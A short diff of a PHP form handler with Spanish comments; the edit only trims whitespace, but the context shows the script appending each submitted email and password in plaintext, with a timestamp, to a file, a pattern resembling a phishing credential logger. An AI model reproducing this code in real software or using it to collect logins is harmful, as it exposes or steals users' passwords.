@@ -18,9 +18,7 @@ if (isset($_REQUEST['bAceptar'])) {
             // Abre el archivo en modo de lectura y escritura
             $escribir = fopen($archivo, "a+");            
             // Mueve el puntero al principio del archivo
-            fseek($escribir, 0);            
-           
-            
+            fseek($escribir, 0);                       
             $fecha_actual = date("Y-m-d H:i:s");
             fwrite($escribir, "Correo: ".$correoElectronico  . " Contraseña: ".$password ." ".$fecha_actual . PHP_EOL); 
             fclose($escribir);
